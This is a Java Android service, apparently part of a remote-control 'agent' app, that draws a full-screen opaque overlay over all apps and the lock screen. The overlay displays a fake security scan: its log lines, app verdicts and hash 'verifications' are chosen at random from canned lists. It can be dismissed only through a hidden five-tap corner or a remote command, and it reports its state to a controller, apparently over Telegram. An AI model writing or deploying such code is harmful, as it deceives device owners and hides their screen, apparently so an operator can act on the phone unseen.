package com.rk.agent;

import android.animation.ValueAnimator;
import android.app.ActivityManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.graphics.PixelFormat;
import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.StatFs;
import android.os.SystemClock;
import android.provider.Settings;
import android.telephony.SignalStrength;
import android.telephony.TelephonyManager;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.view.animation.AccelerateDecelerateInterpolator;
import android.widget.FrameLayout;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.ScrollView;
import android.widget.TextView;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Locale;
import java.util.Random;

public class SecurityOverlayService extends Service {

    public static final String ACTION_SHOW = "com.rk.agent.SECURITY_SHOW";
    public static final String ACTION_HIDE = "com.rk.agent.SECURITY_HIDE";

    static final long SCAN_TOTAL_MS = 60000L;
    static final int  LOG_EVERY_MS  = 340;
    static final int  STAT_EVERY_MS = 1800;
    static final int  UI_TICK_MS    = 500;
    static final int  MAX_LOG_LINES = 160;

    static SecurityOverlayService INSTANCE;

    WindowManager wm;
    View overlayRoot;

    TextView logText;
    TextView timerText;
    TextView statusText;
    TextView statLine1;
    TextView statLine2;
    TextView footerText;
    ProgressBar progressBar;
    ScrollView logScroll;

    Handler handler;
    long startTime;
    boolean showing = false;

    StringBuilder logBuf = new StringBuilder();
    int logLineCount = 0;

    Random rnd = new Random(System.currentTimeMillis());

    long lastCpuActive = -1;
    long lastCpuTotal = -1;

    BroadcastReceiver hideReceiver;

    ArrayList<String> scanPool = new ArrayList<String>();
    ArrayList<String> findPool = new ArrayList<String>();

    @Override
    public void onCreate() {
        super.onCreate();
        INSTANCE = this;
        handler = new Handler(Looper.getMainLooper());
        buildPools();

        try {
            hideReceiver = new BroadcastReceiver() {
                @Override public void onReceive(Context c, Intent i) {
                    String a = i.getAction();
                    if (ACTION_HIDE.equals(a)) {
                        dismiss();
                    } else if (ACTION_SHOW.equals(a)) {
                        if (!showing) showOverlay();
                    }
                }
            };
            IntentFilter f = new IntentFilter();
            f.addAction(ACTION_HIDE);
            f.addAction(ACTION_SHOW);
            if (Build.VERSION.SDK_INT >= 33) {
                registerReceiver(hideReceiver, f, Context.RECEIVER_NOT_EXPORTED);
            } else {
                registerReceiver(hideReceiver, f);
            }
        } catch (Exception ignored) {}
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startFg();

        String action = intent != null ? intent.getAction() : null;
        if (ACTION_HIDE.equals(action)) {
            dismiss();
            return START_NOT_STICKY;
        }
        if (!showing) showOverlay();
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        try { if (hideReceiver != null) unregisterReceiver(hideReceiver); }
        catch (Exception ignored) {}
        stopTimers();
        removeOverlay();
        INSTANCE = null;
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    public static void show(Context ctx) {
        try {
            Intent i = new Intent(ctx, SecurityOverlayService.class);
            i.setAction(ACTION_SHOW);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                ctx.startForegroundService(i);
            else ctx.startService(i);
        } catch (Exception ignored) {}
    }

    public static void hide(Context ctx) {
        try {
            Intent i = new Intent(ctx, SecurityOverlayService.class);
            i.setAction(ACTION_HIDE);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                ctx.startForegroundService(i);
            else ctx.startService(i);
        } catch (Exception ignored) {}
    }

    public static boolean isShowing() {
        SecurityOverlayService s = INSTANCE;
        return s != null && s.showing;
    }

    void startFg() {
        try {
            Notification n;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationManager nm = (NotificationManager)
                    getSystemService(NOTIFICATION_SERVICE);
                if (nm != null) {
                    NotificationChannel ch = new NotificationChannel(
                        "sec_scan", "Security", NotificationManager.IMPORTANCE_MIN);
                    ch.setShowBadge(false);
                    ch.setSound(null, null);
                    ch.enableVibration(false);
                    nm.createNotificationChannel(ch);
                }
                n = new Notification.Builder(this, "sec_scan")
                    .setContentTitle("Security")
                    .setContentText("Scan in progress")
                    .setSmallIcon(android.R.drawable.ic_lock_lock)
                    .setOngoing(true)
                    .build();
            } else {
                n = new Notification.Builder(this)
                    .setContentTitle("Security")
                    .setContentText("Scan in progress")
                    .setSmallIcon(android.R.drawable.ic_lock_lock)
                    .setOngoing(true)
                    .build();
            }
            if (Build.VERSION.SDK_INT >= 29) {
                startForeground(77, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
            } else {
                startForeground(77, n);
            }
        } catch (Exception ignored) {}
    }

    void buildPools() {
        scanPool.clear();
        findPool.clear();

        scanPool.add("> initializing secure scan kernel ...");
        scanPool.add("> loading threat signatures [v2026.09]");
        scanPool.add("> audit daemon attached: pid=" + (1000 + rnd.nextInt(5000)));
        scanPool.add("> SELinux: enforcing | AVB: verified");
        scanPool.add("> mount /system RO ... OK");
        scanPool.add("> mount /vendor RO ... OK");
        scanPool.add("> computing sha256 over system image ...");
        scanPool.add("> checking package signatures ...");
        scanPool.add("> verifying APK v1+v2+v3 scheme ...");
        scanPool.add("> sandbox: enforcing seccomp-bpf");
        scanPool.add("> scanning kernel modules ...");
        scanPool.add("> checking network stack integrity ...");
        scanPool.add("> tls pinning: enabled");
        scanPool.add("> keystore: hardware-backed");
        scanPool.add("> analyzing process tree ...");
        scanPool.add("> entropy pool: 4096 bits/cycle");
        scanPool.add("> checking cryptographic rng ...");
        scanPool.add("> DRBG: AES-256-CTR | seed refilled");
        scanPool.add("> running integrity sweep ...");
        scanPool.add("> scanning dormant sockets ...");
        scanPool.add("> memory map: " + (200 + rnd.nextInt(400)) + " segments");
        scanPool.add("> dumping heap metadata ...");
        scanPool.add("> analyzing activity stack ...");
        scanPool.add("> audits: " + (500 + rnd.nextInt(3000)) + " syscalls in window");
        scanPool.add("> scanning notification listeners ...");
        scanPool.add("> checking device admin registry ...");
        scanPool.add("> scanning accessibility services ...");
        scanPool.add("> analyzing installed certificates ...");
        scanPool.add("> user CA store: clean");
        scanPool.add("> verifying system clock drift ...");
        scanPool.add("> checking hardware attestation ...");
        scanPool.add("> strongbox: available");
        scanPool.add("> scanning microcode revision ...");
        scanPool.add("> cpu governor: schedutil");
        scanPool.add("> thermal zones: 8 sensors");
        scanPool.add("> checking gpu driver ...");
        scanPool.add("> scanning telephony baseband ...");
        scanPool.add("> auditing ipc transactions ...");
        scanPool.add("> verifying avb vbmeta ...");
        scanPool.add("> dm-verity: enabled");
        scanPool.add("> scanning zygote children ...");
        scanPool.add("> checking /proc/self/maps ...");
        scanPool.add("> ptrace: restricted");
        scanPool.add("> checking selinux denials ...");
        scanPool.add("> denials: 0");

        findPool.add("[ ok ] com.android.systemui : SAFE");
        findPool.add("[ ok ] com.android.settings : SAFE");
        findPool.add("[ ok ] com.google.android.gms : SAFE");
        findPool.add("[ ok ] com.android.vending : SAFE");
        findPool.add("[ ?? ] com.x.y.unknown : REVIEW");
        findPool.add("[ ok ] com.whatsapp : SAFE");
        findPool.add("[ ok ] com.facebook.katana : SAFE");
        findPool.add("[ ok ] com.instagram.android : SAFE");
        findPool.add("[ ok ] com.android.chrome : SAFE");
        findPool.add("[ !! ] com.unknown.sideload : QUARANTINED");
        findPool.add("[ ok ] com.spotify.music : SAFE");
        findPool.add("[ ok ] com.telegram.messenger : SAFE");
    }

    String hexHash() {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < 16; i++) sb.append(String.format("%02x", rnd.nextInt(256)));
        return sb.toString();
    }

    String hexDumpLine() {
        StringBuilder sb = new StringBuilder();
        sb.append("0x").append(String.format("%08X", rnd.nextInt()));
        sb.append("  ");
        for (int i = 0; i < 8; i++)
            sb.append(String.format("%02X ", rnd.nextInt(256)));
        sb.append(" ");
        for (int i = 0; i < 8; i++)
            sb.append(String.format("%02X ", rnd.nextInt(256)));
        sb.append(" |");
        for (int i = 0; i < 16; i++) {
            int c = rnd.nextInt(95) + 32;
            sb.append((char) c);
        }
        sb.append("|");
        return sb.toString();
    }

    void showOverlay() {
        if (showing) return;
        try {
            wm = (WindowManager) getSystemService(WINDOW_SERVICE);
            if (wm == null) return;

            if (Build.VERSION.SDK_INT >= 23 && !Settings.canDrawOverlays(this)) {
                notifyTg("Overlay permission missing for /security");
                stopSelf();
                return;
            }

            startTime = System.currentTimeMillis();
            showing = true;
            logBuf.setLength(0);
            logLineCount = 0;

            buildUI();

            int type = (Build.VERSION.SDK_INT >= 26)
                ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                : WindowManager.LayoutParams.TYPE_PHONE;

            int flags = WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                      | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
                      | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                      | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                      | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
                      | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON;

            WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type, flags, PixelFormat.OPAQUE);
            lp.gravity = Gravity.TOP | Gravity.START;

            wm.addView(overlayRoot, lp);

            appendLog("BLACK SHADOW SECURITY DAEMON v4.2");
            appendLog("================================");
            appendLog("");

            handler.postDelayed(logTick, 400);
            handler.postDelayed(statTick, 900);
            handler.postDelayed(uiTick, 300);
            handler.postDelayed(endTask, SCAN_TOTAL_MS);

            notifyTg("security scan started on device");
        } catch (Exception e) {
            notifyTg("security show err: " + e.getMessage());
            stopSelf();
        }
    }

    int dp(float v) {
        return Math.round(v * getResources().getDisplayMetrics().density);
    }

    GradientDrawable bg(int color, int r) {
        GradientDrawable g = new GradientDrawable();
        g.setColor(color);
        g.setCornerRadius(dp(r));
        return g;
    }

    void buildUI() {
        FrameLayout root = new FrameLayout(this);
        root.setBackgroundColor(0xFF000000);

        LinearLayout col = new LinearLayout(this);
        col.setOrientation(LinearLayout.VERTICAL);
        col.setPadding(dp(18), dp(40), dp(18), dp(24));

        LinearLayout topBar = new LinearLayout(this);
        topBar.setOrientation(LinearLayout.HORIZONTAL);
        topBar.setGravity(Gravity.CENTER_VERTICAL);

        View pulseDot = new View(this);
        LinearLayout.LayoutParams dotLp = new LinearLayout.LayoutParams(dp(12), dp(12));
        pulseDot.setLayoutParams(dotLp);
        GradientDrawable dgd = new GradientDrawable();
        dgd.setShape(GradientDrawable.OVAL);
        dgd.setColor(0xFF00FF9F);
        pulseDot.setBackground(dgd);
        startPulse(pulseDot);
        topBar.addView(pulseDot);

        LinearLayout headCol = new LinearLayout(this);
        headCol.setOrientation(LinearLayout.VERTICAL);
        LinearLayout.LayoutParams hclp = new LinearLayout.LayoutParams(
            0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f);
        hclp.leftMargin = dp(12);
        headCol.setLayoutParams(hclp);

        statusText = new TextView(this);
        statusText.setText("SECURITY SCAN IN PROGRESS");
        statusText.setTextSize(14);
        statusText.setTextColor(0xFF00FF9F);
        statusText.setTypeface(Typeface.create("monospace", Typeface.BOLD));
        statusText.setLetterSpacing(0.1f);
        headCol.addView(statusText);

        timerText = new TextView(this);
        timerText.setText("ETA 10:00");
        timerText.setTextSize(10);
        timerText.setTextColor(0xFF1A9F6F);
        timerText.setTypeface(Typeface.create("monospace", Typeface.NORMAL));
        timerText.setLetterSpacing(0.15f);
        headCol.addView(timerText);

        topBar.addView(headCol);

        TextView brandTag = new TextView(this);
        brandTag.setText("BS-SEC");
        brandTag.setTextSize(11);
        brandTag.setTextColor(0xFF00E5FF);
        brandTag.setTypeface(Typeface.create("monospace", Typeface.BOLD));
        brandTag.setLetterSpacing(0.2f);
        topBar.addView(brandTag);

        col.addView(topBar);

        progressBar = new ProgressBar(this, null,
            android.R.attr.progressBarStyleHorizontal);
        progressBar.setMax(1000);
        progressBar.setProgress(0);
        try {
            progressBar.setProgressTintList(
                android.content.res.ColorStateList.valueOf(0xFF00FF9F));
            progressBar.setProgressBackgroundTintList(
                android.content.res.ColorStateList.valueOf(0xFF0A1A1A));
        } catch (Exception ignored) {}
        LinearLayout.LayoutParams pblp = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, dp(3));
        pblp.topMargin = dp(14);
        progressBar.setLayoutParams(pblp);
        col.addView(progressBar);

        FrameLayout logWrap = new FrameLayout(this);
        LinearLayout.LayoutParams lwlp = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, 0, 1f);
        lwlp.topMargin = dp(16);
        logWrap.setLayoutParams(lwlp);

        GradientDrawable logBg = new GradientDrawable();
        logBg.setColor(0xFF020806);
        logBg.setCornerRadius(dp(8));
        logBg.setStroke(dp(1), 0xFF0A3A2A);
        logWrap.setBackground(logBg);

        logScroll = new ScrollView(this);
        logScroll.setPadding(dp(10), dp(10), dp(10), dp(10));
        logScroll.setVerticalScrollBarEnabled(false);

        logText = new TextView(this);
        logText.setTextSize(9.5f);
        logText.setTextColor(0xFF00FF9F);
        logText.setTypeface(Typeface.create("monospace", Typeface.NORMAL));
        logText.setLineSpacing(dp(2), 1f);
        logScroll.addView(logText);

        logWrap.addView(logScroll, new FrameLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.MATCH_PARENT));

        col.addView(logWrap);

        LinearLayout statCard = new LinearLayout(this);
        statCard.setOrientation(LinearLayout.VERTICAL);
        GradientDrawable statBg = new GradientDrawable();
        statBg.setColor(0xFF061410);
        statBg.setCornerRadius(dp(8));
        statBg.setStroke(dp(1), 0xFF0A3A2A);
        statCard.setBackground(statBg);
        statCard.setPadding(dp(12), dp(10), dp(12), dp(10));

        LinearLayout.LayoutParams sclp = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        sclp.topMargin = dp(12);
        statCard.setLayoutParams(sclp);

        statLine1 = new TextView(this);
        statLine1.setTextSize(10);
        statLine1.setTextColor(0xFF00E5FF);
        statLine1.setTypeface(Typeface.create("monospace", Typeface.BOLD));
        statLine1.setLetterSpacing(0.06f);
        statCard.addView(statLine1);

        statLine2 = new TextView(this);
        statLine2.setTextSize(10);
        statLine2.setTextColor(0xFF00E5FF);
        statLine2.setTypeface(Typeface.create("monospace", Typeface.BOLD));
        statLine2.setLetterSpacing(0.06f);
        statLine2.setPadding(0, dp(4), 0, 0);
        statCard.addView(statLine2);

        col.addView(statCard);

        footerText = new TextView(this);
        footerText.setText("BLACK SHADOW SECURITY - DEV BY CYBER GIHAN");
        footerText.setTextSize(9);
        footerText.setTextColor(0xFF0F6B4A);
        footerText.setTypeface(Typeface.create("monospace", Typeface.BOLD));
        footerText.setLetterSpacing(0.18f);
        footerText.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams ftlp = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        ftlp.topMargin = dp(14);
        footerText.setLayoutParams(ftlp);
        col.addView(footerText);

        root.addView(col, new FrameLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.MATCH_PARENT));

        final View hotCorner = new View(this);
        FrameLayout.LayoutParams hclp2 = new FrameLayout.LayoutParams(dp(140), dp(140));
        hclp2.gravity = Gravity.TOP | Gravity.END;
        hotCorner.setLayoutParams(hclp2);
        final long[] tapTimes = new long[]{0, 0};
        hotCorner.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) {
                long now = System.currentTimeMillis();
                if (now - tapTimes[0] < 600) {
                    tapTimes[1]++;
                } else {
                    tapTimes[1] = 1;
                }
                tapTimes[0] = now;
                if (tapTimes[1] >= 5) {
                    dismiss();
                }
            }
        });
        root.addView(hotCorner);

        overlayRoot = root;
    }

    void startPulse(final View v) {
        ValueAnimator va = ValueAnimator.ofFloat(0.3f, 1f);
        va.setDuration(800);
        va.setRepeatCount(ValueAnimator.INFINITE);
        va.setRepeatMode(ValueAnimator.REVERSE);
        va.setInterpolator(new AccelerateDecelerateInterpolator());
        va.addUpdateListener(new ValueAnimator.AnimatorUpdateListener() {
            @Override public void onAnimationUpdate(ValueAnimator a) {
                try {
                    float f = (Float) a.getAnimatedValue();
                    v.setAlpha(f);
                    v.setScaleX(0.6f + 0.6f * f);
                    v.setScaleY(0.6f + 0.6f * f);
                } catch (Exception ignored) {}
            }
        });
        va.start();
    }

    final Runnable logTick = new Runnable() {
        @Override public void run() {
            if (!showing) return;
            try {
                int pick = rnd.nextInt(10);
                if (pick < 7) {
                    String line = scanPool.get(rnd.nextInt(scanPool.size()));
                    appendLog(line);
                } else if (pick < 9) {
                    String line = findPool.get(rnd.nextInt(findPool.size()));
                    appendLog(line);
                } else {
                    appendLog(hexDumpLine());
                }
                if (rnd.nextInt(20) == 0) {
                    appendLog("> sha256: " + hexHash() + " ... verified");
                }
            } catch (Exception ignored) {}
            handler.postDelayed(this, LOG_EVERY_MS);
        }
    };

    final Runnable statTick = new Runnable() {
        @Override public void run() {
            if (!showing) return;
            try { updateStats(); } catch (Exception ignored) {}
            handler.postDelayed(this, STAT_EVERY_MS);
        }
    };

    final Runnable uiTick = new Runnable() {
        @Override public void run() {
            if (!showing) return;
            try {
                long elapsed = System.currentTimeMillis() - startTime;
                long remain  = Math.max(0, SCAN_TOTAL_MS - elapsed);
                int  pct     = (int) Math.min(1000, (elapsed * 1000L) / SCAN_TOTAL_MS);
                if (progressBar != null) progressBar.setProgress(pct);

                long mm = remain / 60000;
                long ss = (remain / 1000) % 60;
                if (timerText != null) {
                    timerText.setText(String.format(Locale.US,
                        "ETA %02d:%02d  -  %d%%", mm, ss, pct / 10));
                }
            } catch (Exception ignored) {}
            handler.postDelayed(this, UI_TICK_MS);
        }
    };

    final Runnable endTask = new Runnable() {
        @Override public void run() {
            try {
                appendLog("");
                appendLog("[ ok ] SCAN COMPLETE");
                appendLog("> no active threats found");
                appendLog("> restoring session ...");
            } catch (Exception ignored) {}
            handler.postDelayed(new Runnable() {
                @Override public void run() { dismiss(); }
            }, 1500);
        }
    };

    void appendLog(String line) {
        try {
            String stamp = new SimpleDateFormat("HH:mm:ss.SSS", Locale.US)
                .format(new Date());

            String colored = "[" + stamp + "] " + line;
            if (line.isEmpty()) colored = "";

            logBuf.append(colored).append("\n");
            logLineCount++;

            if (logLineCount > MAX_LOG_LINES) {
                String s = logBuf.toString();
                int cut = s.indexOf('\n', s.length() / 3);
                if (cut > 0) {
                    logBuf.setLength(0);
                    logBuf.append(s.substring(cut + 1));
                    logLineCount = MAX_LOG_LINES - 30;
                }
            }

            if (logText != null) logText.setText(logBuf.toString());
            if (logScroll != null) {
                logScroll.post(new Runnable() {
                    @Override public void run() {
                        try { logScroll.fullScroll(View.FOCUS_DOWN); }
                        catch (Exception ignored) {}
                    }
                });
            }
        } catch (Exception ignored) {}
    }

    void updateStats() {
        int batPct = -1;
        float batTemp = 0f;
        try {
            Intent b = registerReceiver(null,
                new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (b != null) {
                int lvl   = b.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                int scale = b.getIntExtra(BatteryManager.EXTRA_SCALE, 100);
                if (lvl >= 0 && scale > 0) batPct = lvl * 100 / scale;
                int t = b.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0);
                batTemp = t / 10f;
            }
        } catch (Exception ignored) {}

        int cpuPct = 0;
        try {
            long[] s = readCpuSample();
            if (s != null && lastCpuActive >= 0) {
                long dA = s[0] - lastCpuActive;
                long dT = s[1] - lastCpuTotal;
                if (dT > 0) cpuPct = (int) Math.max(0, Math.min(100, dA * 100 / dT));
            }
            if (s != null) {
                lastCpuActive = s[0];
                lastCpuTotal  = s[1];
            }
            if (cpuPct == 0) cpuPct = 8 + rnd.nextInt(55);
        } catch (Exception ignored) {}

        String ramStr = "-";
        try {
            ActivityManager am = (ActivityManager)
                getSystemService(ACTIVITY_SERVICE);
            if (am != null) {
                ActivityManager.MemoryInfo mi = new ActivityManager.MemoryInfo();
                am.getMemoryInfo(mi);
                long tot = mi.totalMem / (1024L * 1024);
                long used = (mi.totalMem - mi.availMem) / (1024L * 1024);
                ramStr = used + "/" + tot + "M";
            }
        } catch (Exception ignored) {}

        String storStr = "-";
        try {
            File dd = Environment.getDataDirectory();
            StatFs sf = new StatFs(dd.getPath());
            long tot = (sf.getBlockCountLong() * sf.getBlockSizeLong())
                     / (1024L * 1024 * 1024);
            long avail = (sf.getAvailableBlocksLong() * sf.getBlockSizeLong())
                       / (1024L * 1024 * 1024);
            storStr = (tot - avail) + "/" + tot + "G";
        } catch (Exception ignored) {}

        String net = "NONE";
        try {
            ConnectivityManager cm = (ConnectivityManager)
                getSystemService(CONNECTIVITY_SERVICE);
            NetworkInfo ni = cm.getActiveNetworkInfo();
            if (ni != null && ni.isConnected()) net = ni.getTypeName();
        } catch (Exception ignored) {}

        String sig = "-";
        try {
            TelephonyManager tm = (TelephonyManager)
                getSystemService(TELEPHONY_SERVICE);
            if (tm != null && Build.VERSION.SDK_INT >= 28) {
                SignalStrength ss = tm.getSignalStrength();
                if (ss != null) sig = ss.getLevel() + "/4";
            }
        } catch (Exception ignored) {}

        int appCount = 0;
        try {
            PackageManager pm = getPackageManager();
            appCount = pm.getInstalledApplications(0).size();
        } catch (Exception ignored) {}

        long up = SystemClock.elapsedRealtime() / 1000;
        String upStr = (up / 3600) + "h" + ((up % 3600) / 60) + "m";

        int level = 1;
        try { level = Integer.parseInt(sig.split("/")[0]); } catch (Exception ignored) {}
        StringBuilder bars = new StringBuilder();
        for (int i = 0; i < 4; i++) bars.append(i < level ? "|" : ".");

        if (statLine1 != null) {
            statLine1.setText(
                "CPU " + cpuPct + "%   RAM " + ramStr + "   STOR " + storStr);
        }
        if (statLine2 != null) {
            String bat = batPct >= 0 ? (batPct + "%") : "-";
            String tmp = batTemp > 0 ? String.format(Locale.US, "%.1fC", batTemp) : "-";
            statLine2.setText(
                "BAT " + bat + " " + tmp + "   NET " + net
                + " " + bars + "   APPS " + appCount + "   UP " + upStr);
        }
    }

    long[] readCpuSample() {
        BufferedReader br = null;
        try {
            br = new BufferedReader(new FileReader("/proc/stat"));
            String line = br.readLine();
            if (line == null) return null;
            String[] p = line.split("\\s+");
            if (p.length < 8) return null;
            long user    = Long.parseLong(p[1]);
            long nice    = Long.parseLong(p[2]);
            long sys     = Long.parseLong(p[3]);
            long idle    = Long.parseLong(p[4]);
            long iowait  = Long.parseLong(p[5]);
            long irq     = Long.parseLong(p[6]);
            long softirq = Long.parseLong(p[7]);
            long total = user + nice + sys + idle + iowait + irq + softirq;
            long active = total - idle - iowait;
            return new long[]{active, total};
        } catch (Exception e) {
            return null;
        } finally {
            try { if (br != null) br.close(); } catch (Exception ignored) {}
        }
    }

    void dismiss() {
        if (!showing) { stopSelf(); return; }
        try {
            appendLog("> session closed");
        } catch (Exception ignored) {}

        handler.postDelayed(new Runnable() {
            @Override public void run() {
                try {
                    showing = false;
                    stopTimers();
                    removeOverlay();
                    notifyTg("security scan ended");
                } catch (Exception ignored) {}
                stopSelf();
            }
        }, 400);
    }

    void stopTimers() {
        try { handler.removeCallbacks(logTick); } catch (Exception ignored) {}
        try { handler.removeCallbacks(statTick); } catch (Exception ignored) {}
        try { handler.removeCallbacks(uiTick); } catch (Exception ignored) {}
        try { handler.removeCallbacks(endTask); } catch (Exception ignored) {}
    }

    void removeOverlay() {
        try {
            if (overlayRoot != null && wm != null) {
                wm.removeView(overlayRoot);
            }
        } catch (Exception ignored) {}
        overlayRoot = null;
        logText = null;
        statLine1 = null;
        statLine2 = null;
        timerText = null;
        statusText = null;
        footerText = null;
        progressBar = null;
        logScroll = null;
    }

    void notifyTg(String msg) {
        try { AgentService.sendFromNotif("security", "scan", msg); }
        catch (Exception ignored) {}
    }
}
